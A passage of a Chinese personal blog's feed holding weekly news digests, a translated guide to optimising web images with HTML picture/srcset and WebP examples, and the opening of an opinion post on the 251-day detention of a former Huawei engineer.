href="https://www.dw.com/zh/%E4%BA%89%E8%AE%AE%E6%9C%AA%E6%AD%A2-%E5%BE%B7%E7%94%B5%E4%BF%A1%E5%95%86%E5%AE%A3%E5%B8%835g%E7%94%A8%E5%8D%8E%E4%B8%BA/a-51637101" target="_blank" rel="noopener">source</a></li><li>朝鲜再次进行重大试验，增强其核威慑能力。<a href="https://www.dw.com/zh/朝中社：朝鲜再次进行重大试验/a-51668597?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>德国足球明星厄齐尔在社交媒体上发表支持维吾尔穆斯林的言论，央视取消了原定于本周末直播的阿森纳同曼城的比赛。<a href="https://www.dw.com/zh/厄齐尔力挺维吾尔人-央视取消直播阿森纳比赛/a-51680545?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>英国媒体曝光了低下大麻种植产业，约 3000 名<span class="foot-note-span">【关于 3000 这个人数存在争议，不是一家农场 3000，而是全英国一共 3000，且这个数字是估计出来的。不过使用儿童奴隶参与大麻种植是确实存在的】</span>儿童奴隶被迫在不见天日的大麻农场劳作。英国每年非法大麻市场规模近 26 亿英镑，96% 被迫从事大麻种植的为越南偷渡者或人口贩卖受害者。<a href="https://www.zhihu.com/question/360640018" target="_blank" rel="noopener">source</a></li></ul><h4 id="科技与文化">科技与文化</h4><ul><li>小米发布首款 5G 手机 Redmi K30，1999元起售。</li><li>12 月 10 日，苹果官网凌晨正式上架了新款 Mac Pro。其中塔式 47999 元起，架构式 51999 元起。同时苹果官网公布 Pro Display XDR 显示器售价，标准玻璃版售价 39999 元， Nano-texture 纳米纹理玻璃版售价 47999 元，Pro Stand 支架售价 7799 元，VESA 支架转换器售价 1599 元。<a href="https://www.zhihu.com/question/360347056" target="_blank" rel="noopener">source</a></li><li>Google 发布 2019 年搜索排行榜，其中迪士尼新推出的流媒体服务「迪士尼+ (Disney Plus)」成为最热门的搜索词，iPhone 11 则排名第九。<a href="https://www.williamlong.info/archives/5916.html" target="_blank" rel="noopener">source</a></li><li>电影《姜子牙》发布首支预告，电影将于 2020 年大年初一上映。<a href="https://www.bilibili.com/video/av79004503?from=search&amp;seid=11670176180570779482" target="_blank" rel="noopener">预告片传送门</a>。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/8a010830e663bf6758614846d0920736.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>[翻译]网页中的图像优化指南</title>
    <link href="http://www.codewoody.com/posts/27790/"/>
    <id>http://www.codewoody.com/posts/27790/</id>
    <published>2019-12-03T19:07:43.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<p>本文翻译自<a href="https://dev.to/prototyp/optimizing-images-for-the-web-an-in-depth-guide-4j7d" target="_blank" rel="noopener">Optimizing images for the web - an in-depth guide</a></p><p><img src="https://imgs.codewoody.com/uploads/big/11095b11da720ac41968ed26b81beb9d.jpg"></p><p>这篇文章提供了Web开发中涉及图像的一些优化问题：</p><a id="more"></a><ul><li>计算JPG图像文件大小</li><li>在线图像优化</li><li>自动化方案</li><li>图像载入优化</li><li>使用CDN</li><li>WebP图像格式</li><li>为高像素密度的屏幕的优化</li></ul><blockquote><p>上面的目录的前几个部分其实讲的就是图像压缩的问题，不过这里他将的特别的入门级，显得比较啰嗦，我会进行一定的简化。</p></blockquote><p>图像性能常常是网页性能糟糕的一个重要因素，尤其是在初始载入的时候。根据的分辨率和图像质量不同，图像的大小可能占据网站总体积的70%以上。不注重图像性能优化很容易让网站的体验变得非常糟糕。没有经验的开发者则常常忽视这个问题。他们也未能及时接触到相关的优化工具。这篇文章的主旨就在于为Web开发者提供网页中图像性能优化的指南。</p><h2 id="图像压缩">图像压缩</h2><p>未被压缩的图像大小和很容易通过像素数量乘以通道数确定：长 * 宽 * 24bits（RGB颜色系统）。原始图像的大小是非常大的，因此图像压缩就非常重要。</p><p>有一些在线的网站能够提供图像压缩的功能，如：</p><ul><li><a href="https://compressor.io/" target="_blank" rel="noopener">Compressor.io - JPG, PNG, SVG, GIF - 1 file at the time</a></li><li><a href="https://squoosh.app/" target="_blank" rel="noopener">Squoosh - JPG, PNG, SVG, GIF - 1 file at the time</a></li><li><a href="https://imagecompressor.com/" target="_blank" rel="noopener">Optimizilla - JPG and PNG - up to 20 images at the time</a></li><li><a href="https://tinypng.com/" target="_blank" rel="noopener">TinyPNG - JPG and PNG - up to 20 images at the time</a></li><li><a href="https://www.svgminify.com/" target="_blank" rel="noopener">SVGMinify - SVG - 1 file at the time</a></li><li><a href="https://jakearchibald.github.io/svgomg/" target="_blank" rel="noopener">svgomg - SVG - 1 file at the time</a></li></ul><p>不过在开发中大批量的图像处理就不适合用这些网页工具了。在复杂的Web工程中我们一般都会使用一些自动化的构建工具，例如 Gulp, Webpack, Parcel 等。这些自动化工具一般都包含有图像优化的插件，可以完全自动化图像优化处理的过程。这样可以确保所有的图像能够正确地优化。</p><p>这里坐着推荐的插件是 <a href="https://www.npmjs.com/package/imagemin" target="_blank" rel="noopener">imagemin</a>。这一插件非常方便与各种CLI工具或者构建工具集成：</p><ul><li><a href="https://github.com/imagemin/imagemin-cli" target="_blank" rel="noopener">imagemin - CLI</a></li><li><a href="https://github.com/sindresorhus/gulp-imagemin" target="_blank" rel="noopener">imagemin - Gulp</a></li><li><a href="https://github.com/itgalaxy/imagemin-webpack" target="_blank" rel="noopener">imagemin - Webpack</a></li><li><a href="https://github.com/DeMoorJasper/parcel-plugin-imagemin" target="_blank" rel="noopener">imagemin - Parcel</a></li></ul><h2 id="图像载入优化">图像载入优化</h2><p>上面已经介绍了通过压缩图像而不减低分辨率以减少前端需要下载文件体积的方法。不过如果一次性载入的图像数量比较多，网页的性能还是会很糟糕。</p><h3 id="lazy-loading">Lazy Loading</h3><p>Lazy Loading 是指在需要的时候才载入素材的理念。在我们的场景中，只有位于当前用户可视区域内的图像才需要进行载入。</p><p>最简单的 Lazy Loading 方法是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image.jpg"</span> <span class="attr">loading</span>=<span class="string">"lazy"</span> <span class="attr">alt</span>=<span class="string">"sample image"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>也有一些基于 JavaScript 的解决方案：</p><ul><li><a href="https://github.com/verlok/lazyload" target="_blank" rel="noopener">verlok/lazyload</a></li><li><a href="https://github.com/malchata/yall.js/" target="_blank" rel="noopener">yall.js</a></li><li><a href="https://github.com/dinbror/blazy" target="_blank" rel="noopener">Blazy (not actively maintained)</a></li></ul><h3 id="progressive-images">Progressive images</h3><p>Lazy Loading 的问题在于，从 UX 设计角度来看，用户在等待图像载入的时候，面对的是一个空的画面，这个设计不是特别的友好。Progressive images 的概念就是，我们可以先载入一个低质量的图像放在那里，然后载入高质量的图像。低质量的图像体积要小很多，可以很快的完成。这个图像质量逐渐改善的过程也可以分成多步，如下图：</p><p><img src="https://imgs.codewoody.com/uploads/big/aa65cd49aef46db5741f02d249826ba5.jpeg"></p><p>这种设计给予用户一种速度的错觉。用户可以看着图片变得越来越清晰，而非只是盯着一个空白区域。这里是一个 JavaScript 实现的 Progressive images: <a href="https://www.npmjs.com/package/progressive-image" target="_blank" rel="noopener">progressive-image</a>。</p><h3 id="responsive-images">Responsive images</h3><p>使用正确尺寸的图像也是一个需要注意的点。</p><p>例如，我们有一个图像，在桌面端的最大宽度为<code>1920px</code>，在平板端的最大宽度为<code>1024px</code>，移动端的最大宽度为<code>568px</code>。简单的方法是使用一个<code>1920px</code>的图像用于所有的情况。但是这样就意味着平板用户和移动用户需要载入其实完全不必要的数据。</p><p>我么可以使用 <code>picture</code> 元素来告诉浏览器根据设备类型去下载哪个图片。这个元素大约被93%的用户的浏览器支持，不过我们可以内嵌使用 <code>img</code> 元素来实现 fallback。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">media</span>=<span class="string">"(min-width: 1025px)"</span> <span class="attr">srcset</span>=<span class="string">"image_desktop.jpg"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">media</span>=<span class="string">"(min-width: 769px)"</span> <span class="attr">srcset</span>=<span class="string">"image_tablet.jpg"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image_mobile.jpg"</span> <span class="attr">alt</span>=<span class="string">"Sample image"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">picture</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用-cdn">使用 CDN</h2><p>一些 CDN，例如 Cloudinary 还有 Cloudflare 可以在服务器上进行图像优化。如果你使用了 CDN 服务，注意留意一下 CDN 服务提供商是否提供了图像优化的服务。这就可以让我们省下很多功夫了。</p><h2 id="webp-图像格式">WebP 图像格式</h2><blockquote><p>最近看到了好多 WebP 格式的图像啊，尤其是微信公众号的文章里都是这种格式。别的优点还不清楚，不过给图像直接下载设置了一点障碍。</p></blockquote><p>WebP 图像格式由 Google 开发，是一种特别针对 Web 场景优化的格式。根据 canIUse 的数据，WebP 格式的图像在大约 80% 的场景下使用。为了保险设计 Fallback机制，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">type</span>=<span class="string">"image/webp"</span> <span class="attr">srcset</span>=<span class="string">"image.webp"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"image.jpg"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image.jpg"</span> <span class="attr">alt</span>=<span class="string">"Sample image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">picture</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有很多在线转化工具可以将图像转化成 WebP 格式。如果 CDN 能够提供这种支持就是最为省心了。</p><h2 id="为高像素密度的屏幕的优化">为高像素密度的屏幕的优化</h2><p>这更多的是 UX 方面的改善，而非性能方面的改善。例如在我们子啊一个 <code>768px</code> 宽度的屏幕中展示 <code>768px x 320px</code> 的图像，而这个设备的像素密度是2x，则设备屏幕实际的像素宽度是 <code>2 x 768 = 1536px</code>。那么实际上我们是将一个 <code>768px</code> 的图像拉伸了两倍。为了最优化图像在高分辨率设备上的显示，我们需要额外指定一个两倍甚至三倍分辨率的图像。这一图像通过<code>srcset</code>属性来设置：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image-1x.jpg"</span> <span class="attr">srcset</span>=<span class="string">"image-2x.jpg 2x"</span> <span class="attr">alt</span>=<span class="string">"Sample image"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>一个完整的响应式的，支持 WebP/PNG 格式以及高分辨率屏幕的例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/webp/hero-image-420-min.webp 1x, ./images/webp/hero-image-760-min.webp 2x"</span> <span class="attr">type</span>=<span class="string">"image/webp"</span> <span class="attr">media</span>=<span class="string">"(max-width: 440px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/minified/hero-image-420-min.png 1x, ./images/minified/hero-image-760-min.png 2x"</span> <span class="attr">media</span>=<span class="string">"(max-width: 440px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/webp/hero-image-550-min.webp 1x, ./images/webp/hero-image-960-min.webp 2x"</span> <span class="attr">type</span>=<span class="string">"image/webp"</span> <span class="attr">media</span>=<span class="string">"(max-width: 767px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/minified/hero-image-550-min.png 1x, ./images/minified/hero-image-960-min.png 2x"</span> <span class="attr">media</span>=<span class="string">"(max-width: 767px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/webp/hero-image-420-min.webp 1x, ./images/webp/hero-image-760-min.webp 2x"</span> <span class="attr">type</span>=<span class="string">"image/webp"</span> <span class="attr">media</span>=<span class="string">"(max-width: 1023px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/minified/hero-image-420-min.png 1x, ./images/minified/hero-image-760-min.png 2x"</span> <span class="attr">media</span>=<span class="string">"(max-width: 1023px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/webp/hero-image-760-min.webp 1x, ./images/webp/hero-image-960-min.webp 2x"</span> <span class="attr">type</span>=<span class="string">"image/webp"</span> <span class="attr">media</span>=<span class="string">"(max-width: 1919px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/minified/hero-image-760-min.png 1x, ./images/minified/hero-image-960-min.png 2x"</span> <span class="attr">media</span>=<span class="string">"(max-width: 1919px)"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/webp/hero-image-960-min.webp"</span> <span class="attr">type</span>=<span class="string">"image/webp"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"./images/minified/hero-image-960-min.png"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">"./images/minified/hero-image-960-min.png"</span> <span class="attr">alt</span>=<span class="string">"Example"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文翻译自&lt;a href=&quot;https://dev.to/prototyp/optimizing-images-for-the-web-an-in-depth-guide-4j7d&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Optimizing images for the web - an in-depth guide&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/11095b11da720ac41968ed26b81beb9d.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;这篇文章提供了Web开发中涉及图像的一些优化问题：&lt;/p&gt;
    
    </summary>
    
    
      <category term="翻译" scheme="http://www.codewoody.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="web" scheme="http://www.codewoody.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-24</title>
    <link href="http://www.codewoody.com/posts/4652/"/>
    <id>http://www.codewoody.com/posts/4652/</id>
    <published>2019-12-02T04:28:48.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="华为251事件"><a href="https://zh.wikipedia.org/wiki/%E8%8F%AF%E7%82%BA251%E4%BA%8B%E4%BB%B6" target="_blank" rel="noopener">华为251事件</a></h3><p>华为251事件，又被称之为李洪元事件，是2018年12月16日到2019年8月23日发生于中国大陆的一桩刑事案件。原华为技术有限公司的员工李洪元在离职后，被华为以职务侵占（先被改为泄露商业机密，后再被改为敲诈勒索）为由向警方报案而遭羁押共计251日，终因证据不足而获检察院不起诉处分并释放。2019年11月下旬，案件细节被披露到互联网，迅速引起广大讨论。</p><blockquote><p>这事儿说的太累了，多说感觉也没啥用，还是一贯地💊。</p></blockquote><h3 id="美国对多国加征关税">美国对多国加征关税</h3><p>为报复法国对互联网巨头开征数字税，美国政府周一宣布将对法国价值24亿美元商品开征最高100%的关税，最早明年1月生效。法国财政部长勒梅尔次日表示，美国对法国商品的关税威胁是“不可接受的”，法国和欧盟准备予以回击。法国经济部副部长卢纳歇尔也表示，法国是很“好斗的”，将在数字税问题上与美国“针锋相对”，决不让步。<a href="https://www.dw.com/zh/%E6%9B%BF%E8%B0%B7%E6%AD%8C%E8%84%B8%E4%B9%A6%E5%A4%8D%E4%BB%87-%E7%BE%8E%E5%9B%BD%E5%A8%81%E8%83%81%E5%90%91%E6%B3%95%E5%9B%BD%E5%BE%81100%E5%85%B3%E7%A8%8E/a-51508085" target="_blank" rel="noopener">source</a></p><p>12月2日，特朗普表示美国将立即“恢复”对从巴西和阿根廷进口的钢铝产品加征关税。特朗普当天在社交媒体发文称，巴西和阿根廷两国货币大幅贬值，这对美国农民不利。他表示美国将立即“恢复”对巴西和阿根廷钢铝产品加征关税。<a href="http://www.xinhuanet.com/world/2019-12/03/c_1125299880.htm" target="_blank" rel="noopener">source</a></p><h3 id="北约-70-周年峰会">北约 70 周年峰会</h3><p>北约（北大西洋公约组织）各国领导人星期二（12月3日）在伦敦举行为期两天的北约特别峰会<span class="foot-note-span">【发言人尽力避免使用“峰会”这个词，理由是去年刚开过正式的峰会，而今年只是领导人碰个头，交换一下意见，最后也不发布正式公告。<a href="https://www.bbc.com/zhongwen/simp/world-50644305" target="_blank" rel="noopener">source</a>】</span>。今年正值北约成立 70 周年。</p><p><img src="https://imgs.codewoody.com/uploads/big/1528e5582b2543ce9d376aa77758be4a.jpg"></p><p>进来北约似乎诸事不顺。先有法国总统马克龙在接受英国《经济学人》采访时，谈到北约，使用了「脑死亡」这个词。马克龙提到华盛顿决定从叙利亚撤军居然没有通知北约。后来，又有土耳其总统埃尔多安表示，若是北约不认可他们将叙利亚库尔德武装认定为恐怖组织的做法，他们将否决北约防卫波罗的海的一项计划。本来欧洲各国对于美国背叛库尔德人已经怨声载道，要认定库尔德武装为恐怖组织是欧洲各国无法接受的。</p><p>北约峰会周三（12月4日）在伦敦达成一份结束性声明。盟友们重申了相互支持的立场，指出中国是新的挑战，俄罗斯仍然是潜在的风险。北京则回应称，中国是“和平力量”，表示目前世界面临的最大威胁是单边主义和霸凌行径。<a href="https://www.dw.com/zh/北约首次定义中国为挑战/a-51532504?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></p><ul><li><a href="https://www.bbc.com/zhongwen/simp/world-50644305" target="_blank" rel="noopener">北约成立70年： 老兵遇到新情况 未来叵测</a></li><li><a href="https://news.sina.com.cn/c/2019-12-04/doc-iihnzhfz3694622.shtml" target="_blank" rel="noopener">这一届北约峰会上，“大佬们”的嘴仗有点好看</a></li><li><a href="https://www.dw.com/zh/%E5%AF%B9%E5%8D%8E%E6%88%98%E7%95%A5%E6%88%90%E5%8C%97%E7%BA%A6%E5%B3%B0%E4%BC%9A%E9%87%8D%E8%A6%81%E8%AE%AE%E9%A2%98/a-51514705" target="_blank" rel="noopener">对华战略成北约峰会重要议题</a></li></ul><h3 id="华为在美国起诉fcc违宪"><a href="https://www.dw.com/zh/华为在美国起诉fcc违宪/a-51539091?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">华为在美国起诉FCC违宪</a></h3><p>华为周四（12月5日）在总部深圳宣布正式起诉美国联邦通信委员会（FCC），理由是有关禁止华为参与联邦补贴资金项目的决定，违反美国宪法以及其它法令。这是今年华为向特朗普政府提交的第二项诉讼。</p><p>今年11月22日，FCC发表声明认定华为是美国国家安全威胁，由此禁止美国农村地区运营商使用国有的通用服务基金（USF）购买华为设备。华为有30天时间对这一禁令进行抗辩，而强制移除设备的最终命令最早要到明年才会出台。</p><p>华为本次在新奥尔良联邦法院递交的诉状写道，FCC上月不准农村运营商使用国家拨款安装华为和中兴通信设备，是不恰当的做法。在深圳召开的新闻发布会上，华为首席法务官宋柳平说，FCC的决定是出于政治考量，而不是因为风险问题。</p><h3 id="支付宝发生短暂崩溃"><a href="https://www.guancha.cn/ChanJing/2019_12_06_527572.shtml" target="_blank" rel="noopener">支付宝发生短暂崩溃</a></h3><p>12月5日下午5时左右，多地网友反应称，支付宝出现故障导致账号无法正常支付、无法收到验证码、无法登录等一系列问题。</p><p>出现问题之后，“支付宝崩了”一度成为了热搜话题。不过在5时25分，支付宝官方微博回复称：“刚刚，支付宝的机房网络出现了短暂抖动，影响了部分用户的使用体验。一切已经恢复正常，大家的资金和信息安全不会受到影响。”</p><p>与此同时，还有消费者调侃了支付宝，是不是过几天需要还的花呗可以不用还了？</p><p><img src="https://imgs.codewoody.com/uploads/big/c8d76f482d8ac67682b3d186fddc062c.jpg"></p><h3 id="其他新闻">其他新闻</h3><h4 id="国内">国内</h4><ul><li>中国国家能源局原局长努尔·白克力因受贿罪被判处无期徒刑。<a href="https://cn.reuters.com/article/china-ndrc-enr-head-sentence-1202-idCNKBS1Y60XL?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>12 月 5 日，兰州兽医研究所近百名学生布鲁氏杆菌病感染血清型阳性。<a href="https://www.zhihu.com/question/359453806" target="_blank" rel="noopener">source</a></li><li>驻澳门部队某步兵营装甲连记集体一等功。</li><li>12 月 4 日湖南浏阳烟花厂发生爆炸事故。爆炸已致 7 死多伤。<a href="https://www.zhihu.com/question/359303630/answer/923048417" target="_blank" rel="noopener">source</a></li></ul><h4 id="国际">国际</h4><ul><li>中国和巴基斯坦自贸协定第二阶段协议书生效，两国间相互实施零关税产品的税目数比例将从此前的35%逐步增加至75%。<a href="http://sputniknews.cn/economics/201912021030148773/" target="_blank" rel="noopener">source</a></li><li>俄土领导人将于1月8日举行会面，地点定在伊斯坦布尔。<a href="http://sputniknews.cn/russia/201912021030155198/" target="_blank" rel="noopener">source</a></li><li>印度2019年第三季度GDP增速持续下滑到4.5%，为6年多来最低水平。<a href="https://www.zhihu.com/question/358502650/answer/919679607" target="_blank" rel="noopener">source</a></li><li>中俄天然气管道开通，这是苏联解体后俄罗斯最大的能源工程。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-50634140" target="_blank" rel="noopener">source</a></li><li>美国众议院以压倒性优势通过《维吾尔人权正则法案》。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-50654656" target="_blank" rel="noopener">source</a></li><li>韩国歌手车仁河自杀，是近来第三位自杀的韩国艺人。<a href="https://www.dw.com/zh/歌手车仁河殒命-韩流-圈数月内第三宗死亡/a-51528910?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>美国众议院议长佩洛西宣布起草弹劾条款。<a href="http://www.bbc.com/zhongwen/simp/world-50678161" target="_blank" rel="noopener">source</a></li><li>周四，法国有 80 万人走上街头抗议政府退休金改革计划，其人数是「黄背心」辉煌时期的三倍。<a href="https://www.dw.com/zh/25年来最大规模罢工-马克龙执政受考验/a-51550849?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li></ul><h4 id="科技">科技</h4><ul><li>Google 联合创始人 Larry Page 和 Sergey Brin 不再担任公司管理职位。Google CEO Sundar Pichai 将同时兼任母公司 Alphabet 的 CEO。</li><li>12 月 3 日，罗永浩举办「老人与海」黑科技发布会，发布会涉及的主要技术为佛罗里达大学材料科学教授安东尼·布伦南于2007年创立的 Sharklet Technologies 的抗菌材料。其材料的抗菌原理为模拟鲨鱼皮的围观纹理结构，降低病菌附着的可能。成立十年以后 Sharklet 公司被杭州一家医疗器械资产公司 Peaceful Union 收购。罗永浩与今年加入了的这家公司。 3 日发布的具体产品包括基于 Sharklet 鲨鱼皮技术的抗菌旅行箱，抗菌儿童背包等。<a href="https://36kr.com/p/5271891" target="_blank" rel="noopener">source</a></li><li>12 月 4 日，主题为「为你的笑容而来」的国行 Nintendo Switch<sup style="font-size: 50%">TM</sup> 产品上市发布会，在上海正式举办。发布会上，腾讯携手任天堂宣布，腾讯引进 Nintendo Switch 将于 12 月 10 日正式发售。国行版 Nintendo Switch 为续航增强版且预装《新 超级马力欧兄弟U 豪华版》体验版，官方建议零售价 2099 元，于 12 月 4 日中午 12 时在京东和天猫官方旗舰店开启预售。腾讯同时表示 Nintendo Switch Lite 的引进工作正在筹备中。<a href="https://www.zhihu.com/question/359173802" target="_blank" rel="noopener">source</a></li></ul><p><img src="https://imgs.codewoody.com/uploads/big/953113ef73768c5d57a74617bfcc7205.jpeg"></p><ul><li>华为发布了 ARM 架构的台式机主板，使用自家的 CPU 鲲鹏 920。</li></ul><p><img src="https://imgs.codewoody.com/uploads/big/5153b03dc6abd5e76902e11a9d308fec.jpg"></p><h2 id="言论">言论</h2><ul><li>一个组织不管是出于什么原因而被建立，之后他的首要任务都是维持自身的存在。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/57ff1d652828123817e2eba8b6061242.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>高技术人才长期羁押问题</title>
    <link href="http://www.codewoody.com/posts/62057/"/>
    <id>http://www.codewoody.com/posts/62057/</id>
    <published>2019-12-01T06:04:11.000Z</published>
    <updated>2020-01-16T05:12:52.818Z</updated>
    
    <content type="html"><![CDATA[<p>近期华为一位工程师在获取离职赔偿之后被公司诬告，导致他被羁押了251天的事情再次带来了社会舆论对于技术人才遭遇的这种司法不公的关注。似乎在这种问题上，我国的取保候审制度似乎就成了摆设。</p><a id="more"></a><p>2019年12月2日更新：</p><p><img src="https://imgs.codewoody.com/uploads/big/43ac710fa2ccd3d28caa984742a02dcb.jpg"></p><hr><h2 id="血淋淋的案例">血淋淋的案例</h2><h3 id="华为李洪元251天">华为·李洪元·251天</h3><p>11月28日一份刑事赔偿决定书在网上流传，一位华为离职员工李洪元索要2N赔偿之后，被华为控告敲诈勒索，于2018年12月16日被拘留，法院认定犯罪事实不清，证据不足，不符合起诉条件，关押251天后李洪元重回自由。</p><p>在法院的宣判文中，深圳龙岗法院表示：深圳市公安局移送审查起诉的犯罪嫌疑人李洪元涉嫌敲诈勒索罪一案退回公安机关第二次补充侦查。深圳市公安局于7月10日提交了《补充侦查报告》，反映了其在与李洪元商谈离职补偿问题时，李洪元根本不存在敲诈勒索的行为。为此，鉴于李洪元的行为根本不构成犯罪或者依法不应追究刑事责任的实际情况，依照《刑事诉讼法》第一百七十三条第一款及第一百七十一条第四款之规定，对华为该员工作出法定不起诉的决定。</p><p>经本院审查并通过补充侦查，仍然认为深圳市公安局认定的犯罪事实不清，证据不足，不符合起诉条件。于2019年8月22日决定对李洪元不起诉。对赔偿请求人李洪元予以国家赔偿，包括人身自由损害赔偿金79300.94元，精神损害抚慰金27755元，两项合计107522. 94元。向李洪元原工作单位、其父亲李洪元所在的工作单位发函、为其消除影响、恢复名誉。</p><p>从宣判文中可见：</p><ol type="1"><li>李洪元2005年入职华为担任工程师，离职前在逆变器销售管理部工作，2018年1月31日离职，在华为工作13年之久，主动离职与辞退离职尚未知晓。</li><li>离职过程中，因为补偿金额发生争议，商议后补偿33万元左右。</li><li>2018年3月8日，李洪元离职近40天后，华为向其转款补偿金，注意是通过私人账号，同时备注转款原因离职经济补偿。</li></ol><p>李洪元得以免除牢狱之灾，还是因为其妻子提供了当时李洪元同HR的谈判录音，才最终证明了李洪元通过私人转账获得的几十万是离职赔偿，而非诈骗款。这么看来，当初HR要以私人账户转33万给李洪元，难道不是提早做局么？</p><p>到目前为止，华为的公关部门广泛在网上删帖屏蔽这一消息，知乎上3000万热度的问题，转眼就没了。微信公众号的文章，也有不少被和谐的。</p><p><img src="https://imgs.codewoody.com/uploads/big/683437d66517279c33c5c90e38092a9c.jpg"></p><p><img 